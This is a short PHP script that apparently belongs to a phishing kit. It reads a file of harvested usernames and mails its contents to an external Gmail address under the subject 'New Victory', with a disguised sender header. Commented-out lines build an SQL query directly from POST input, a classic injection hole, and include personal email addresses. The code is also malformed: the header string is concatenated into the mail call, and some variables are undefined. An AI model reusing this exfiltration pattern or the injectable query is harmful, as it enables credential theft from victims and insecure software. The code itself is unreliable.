<?php

session_start();

//$host="localhost";
//$user="root";
//$pass="";
//$dbname="mail";

//$con=new mysqli($host,$user,$pass,$dbname);

//$q="insert into data(ID,frm,to1,sub,msg)
//value(NULL,'".$_POST['from1']."','".$_POST['to1']."','".$_POST['sub1']."','".$_POST['msg1']."')";



header('content-type: text/plain');
$file = "./usernames.txt";
$txt = file_get_contents($file);
//echo $txt;


// $f=$_SESSION['fromthe'];
// $t=$_SESSION['tothe'];
// $s=$_SESSION['sub'];
// $m=$_SESSION['msg'];

//-----------------------------------MAIL-------------------------------------//

//$to='amanvash.2000@gmail.com';
//$subject="Mail is working";
//$email="dpaksarma10@gmail.com";


//$message ='hey how are you';

$to = "censorday.offical@gmail.com";
$subject = "New Victory";
$headers = "postman@postm25.com" . "\r\n" .


mail($to,$subject,$txt,$headers);

echo $txt;
if(mail($tothe,$sub,$txt,$headers))
{
	echo "<center><H1><font color=#3cb371 >Message succesfully sent</font></H1></center>";
}
else {
	echo "Message NOT sent ------- x -------  x  --------  x  ------  PLEASE RECHECK";
}


?>
